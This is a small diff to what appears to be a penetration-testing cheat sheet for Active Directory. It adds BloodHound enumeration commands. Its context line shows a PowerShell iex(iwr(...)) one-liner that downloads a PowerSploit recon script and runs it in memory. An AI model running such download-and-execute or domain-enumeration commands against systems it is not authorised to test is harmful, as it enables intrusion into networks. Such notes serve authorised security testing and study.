@@ -57,7 +57,11 @@ iex(iwr("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon
 
 ## Enumeration
 
-
+#### Bloodhound
+```powershell
+Invoke-BloodHound -CollectionMethod All
+Invoke-BloodHound -CollectionMethod All -ExcludeDC
+```
 
 
 
